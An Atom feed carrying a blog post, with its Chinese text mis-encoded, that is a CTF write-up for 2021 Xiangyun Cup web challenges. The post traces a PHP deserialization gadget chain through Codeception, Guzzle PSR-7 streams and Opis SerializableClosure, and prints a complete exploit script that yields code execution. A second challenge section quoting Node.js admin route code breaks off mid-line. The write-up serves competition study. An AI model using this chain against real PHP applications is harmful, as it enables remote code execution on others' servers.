<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fxizenta</title>
  <icon>https://www.gravatar.com/avatar/4228837cba43fcbe7a475443e3f4ec19</icon>
  <subtitle>å¤ªé˜³å°šè¿œï¼Œä½†å¿…æœ‰å¤ªé˜³</subtitle>
  <link href="http://www.fxizenta.design/atom.xml" rel="self"/>
  
  <link href="http://www.fxizenta.design/"/>
  <updated>2021-08-25T13:51:37.468Z</updated>
  <id>http://www.fxizenta.design/</id>
  
  <author>
    <name>Fxizenta</name>
    <email>fxizenta14@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021ç¥¥äº‘æ¯_web_wpå’Œå¤ç°</title>
    <link href="http://www.fxizenta.design/2021/08/25/xyctf2021wp/"/>
    <id>http://www.fxizenta.design/2021/08/25/xyctf2021wp/</id>
    <published>2021-08-25T13:45:56.000Z</published>
    <updated>2021-08-25T13:51:37.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021ç¥¥äº‘æ¯-web-wp"><a href="#2021ç¥¥äº‘æ¯-web-wp" class="headerlink" title="2021ç¥¥äº‘æ¯_web_wp"></a>2021ç¥¥äº‘æ¯_web_wp</h1><p>æ¯”èµ›çš„wpä»¥åŠèµ›åå¤ç°ï¼Œè¿™æ¬¡æ¯”èµ›æ€»çš„èµ›é¢˜ä¹Ÿæ›´åå‘äºjså’Œjavaäº†ï¼Œçœ‹æ¥phpè¦é€æ¸é€€å‡ºèˆå°äº†å—ï¼Ÿï¼ˆdoge</p><h1 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h1><p>yiié“¾å­å¤§å…¨è§äº<a href="https://xz.aliyun.com/t/9948#toc-0">https://xz.aliyun.com/t/9948#toc-0</a></p><p>å¯æƒœç­‰æˆ‘å¼€å§‹åšé¢˜æ—¶ï¼Œæ–‡ç« ä½œè€…å·²ç»å‘ç°å½±å“æ¯”èµ›äºæ˜¯å…ˆæŠŠæ¶‰åŠæ¯”èµ›çš„ç¬¬å››æ¡é“¾å­ä¸‹äº†ï¼Œä¸‹é¢æ˜¯å¯¹äºè¿™ä¸ªé“¾å­åˆ©ç”¨çš„åˆ†æ</p><p>é¦–å…ˆå‡ºé¢˜äººè¿˜æ˜¯éå¸¸å‹å¥½çš„å§è¦ç”¨åˆ°çš„ç±»å‡½æ•°æ‰ç»™äº†æˆ‘ä»¬ï¼ˆæ„Ÿè°¢å–„è‰¯çš„å‡ºé¢˜äººï¼‰</p><p>é¢˜ç›®æ˜æ˜¾ååºåˆ—åŒ–ï¼Œç»™çš„æºç ä¸­ä¹Ÿåªæœ‰ä¸€ä¸ª<code>__destruct</code></p><p>äºæ˜¯å…¥å£å˜çš„æ˜æ˜¾èµ·æ¥</p><p>ä¹Ÿå°±æ˜¯è¿™é‡Œ</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="Untitled"></p><p>é‚£ä¹ˆå°±æ¥çœ‹çœ‹<code>stopProcess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå¯ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•çš„åœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯<code>process</code>è°ƒç”¨å‡½æ•°å¯ä»¥è§¦å‘<strong>call,è¿˜æœ‰å°±æ˜¯åé¢é‚£ä¸ªå­—ç¬¦ä¸²å¯ä»¥è§¦å‘</strong>toString</p><p>å”¯ä¸€çš„__call</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="Untitled"></p><p>å”¯ä¸€çš„__toString</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="Untitled"></p><p>è°ƒç”¨å‡½æ•°çš„åœ°æ–¹æœ‰ä¸¤ä¸ªä¸€ä¸ªæ˜¯processesï¼Œä¸€ä¸ªæ˜¯getCommandLineï¼Œprocessesåœ¨ifé‡Œï¼Œä¹Ÿæ²¡æ³•åˆ©ç”¨,äºæ˜¯å°±çœ‹çœ‹ä¸‹é¢é‚£ä¸ªgetCommandLineï¼Œä»–æ˜¯å¯ä»¥å’Œ<strong>toStringä¸€èµ·é…åˆä½¿ç”¨çš„,é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±å˜æˆè®©è®©processâ†’getCommandLineè¿”å›ä¸€ä¸ªæœ‰</strong>toStringå‡½æ•°çš„ç±»ï¼Œä¹Ÿå³AppendStream,äºæ˜¯åªè¦è®©<strong>callè¿”å›AppendStreamå³å¯æˆåŠŸè°ƒç”¨</strong>toString</p><p>è€Œ__toStringæ˜¯ç›´æ¥è¿›rewindï¼Œç„¶ååˆ°seekï¼Œseekå‡½æ•°å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$whence</span> = SEEK_SET</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;seekable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;This AppendStream is not seekable&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$whence</span> !== SEEK_SET) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;The AppendStream can only seek with SEEK_SET&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pos = <span class="keyword">$this</span>-&gt;current = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Rewind each stream</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;streams <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$stream</span>-&gt;rewind();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;Unable to seek stream &#x27;</span></span><br><span class="line">                    . <span class="variable">$i</span> . <span class="string">&#x27; of the AppendStream&#x27;</span>, <span class="number">0</span>, <span class="variable">$e</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥è°ƒç”¨å…¶ä»–streamçš„rewindå‡½æ•°ï¼Œé‚£å…ˆæ¥çœ‹çœ‹å“ªäº›æ˜¯æœ‰è¿™ä¸ªå‡½æ•°çš„ï¼Œå‘ç°åªæœ‰CachingStream</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="Untitled"></p><p>CachingStreamçš„rewindå‡½æ•°ç›´æ¥è°ƒç”¨seekï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;seek(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$byte</span> = <span class="variable">$offset</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Read the remoteStream until we have read in at least the amount</span></span><br><span class="line">            <span class="comment">// of bytes requested, or we reach the end of the file.</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span> &amp;&amp; !<span class="keyword">$this</span>-&gt;remoteStream-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;read(<span class="variable">$diff</span>);</span><br><span class="line">                <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// We can just do a normal seek since we&#x27;ve already seen this byte.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream-&gt;seek(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥è°ƒç”¨è‡ªå·±çš„readå‡½æ•°ï¼Œå³ä¸‹é¢è¿™ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Perform a regular read on any previously read data from the buffer</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;stream-&gt;read(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - strlen(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// More data was requested so read from the remote stream</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="comment">// If data was written to the buffer in a position that would have</span></span><br><span class="line">            <span class="comment">// been filled from the remote stream, then we must skip bytes on</span></span><br><span class="line">            <span class="comment">// the remote stream to emulate overwriting bytes from that</span></span><br><span class="line">            <span class="comment">// position. This mimics the behavior of other PHP stream wrappers.</span></span><br><span class="line">            <span class="variable">$remoteData</span> = <span class="keyword">$this</span>-&gt;remoteStream-&gt;read(</span><br><span class="line">                <span class="variable">$remaining</span> + <span class="keyword">$this</span>-&gt;skipReadBytes</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;skipReadBytes) &#123;</span><br><span class="line">                <span class="variable">$len</span> = strlen(<span class="variable">$remoteData</span>);</span><br><span class="line">                <span class="variable">$remoteData</span> = substr(<span class="variable">$remoteData</span>, <span class="keyword">$this</span>-&gt;skipReadBytes);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;skipReadBytes = max(<span class="number">0</span>, <span class="keyword">$this</span>-&gt;skipReadBytes - <span class="variable">$len</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> .= <span class="variable">$remoteData</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream-&gt;write(<span class="variable">$remoteData</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªreadå‡½æ•°ï¼Œå¯ä»¥è°ƒç”¨å…¶ä»–ç±»çš„readå‡½æ•°ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è°ƒç”¨PumpStreamçš„readå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$readLen</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tellPos += <span class="variable">$readLen</span>;</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - <span class="variable">$readLen</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pump(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="variable">$data</span> .= <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tellPos += strlen(<span class="variable">$data</span>) - <span class="variable">$readLen</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pump</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;source) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = call_user_func(<span class="keyword">$this</span>-&gt;source, <span class="variable">$length</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">false</span> || <span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;source = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;buffer-&gt;write(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$length</span> -= strlen(<span class="variable">$data</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="variable">$length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œä¹Ÿå°±å¯ä»¥ä½¿ç”¨pumpï¼Œäºæ˜¯åœ¨pumpé‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨call_user_funcè¿™ä¸ªå›è°ƒå‡½æ•°ï¼Œä¸è¿‡æˆ‘åœ¨æ¯”èµ›æ—¶ä¹Ÿæ˜¯å¡åœ¨äº†è¿™é‡Œï¼Œå› ä¸ºlengthåªèƒ½æ˜¯æ•°å­—ï¼Œå®åœ¨æƒ³ä¸åˆ°é‡‡ç”¨ä»€ä¹ˆåˆ©ç”¨å§¿åŠ¿æ‰èƒ½è¾¾åˆ°catflagçš„ç›®çš„ï¼Œç”šè‡³å®ç°rceï¼Œä¸‹é¢æ˜¯äº‹åçœ‹daolaoçš„wpå­¦ä¹ çš„</p><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªSerializableClosureç±»çš„ï¼Œè¿™ä¸ªç±»å…è®¸æˆ‘ä»¬åºåˆ—åŒ–ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆæ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸èƒ½åºåˆ—åŒ–åŒ¿åå‡½æ•°çš„ï¼‰ï¼Œè€Œè¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ª__invokeæ–¹æ³•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;closure, func_get_args());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è§¦å‘æ—¶è°ƒç”¨å¦‚ä¸Šä»£ç ï¼Œé‚£ä¹ˆæ•´ä¸ªpayloadçš„æœ€åä¸€ç¯å°±ç”±ä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„ä»»æ„ä»£ç æ‰§è¡Œçš„åŒ¿åå‡½æ•°è§£å†³</p><p>é‚£ç°åœ¨å°±ç®€å•äº†é€šè¿‡pumpçš„call_user_funcæ¥è§¦å‘ __invokeè¿›è€Œè§¦å‘å‚æ•°å®Œå…¨å¯ä»¥è‡ªå·±æŠŠæ¡çš„<code>call_user_func_array</code>ï¼ˆå¤ªç§€äº†è¿™æ­¥ï¼Œä¹‹å‰å®Œå…¨æ²¡æƒ³åˆ°ï¼‰</p><p>expï¼ˆæ¥è‡ªå…ˆçŸ¥ç¤¾åŒº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>=<span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;phpinfo();&#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h1><p>è´¦å·å¯†ç åœ¨databaseå¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°flagåœ¨superuserä¸‹</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%204.png" alt="Untitled"></p><p>ä¸»è¦æ˜¯è¿™ä¸‰ä¸ªæ¥å£</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 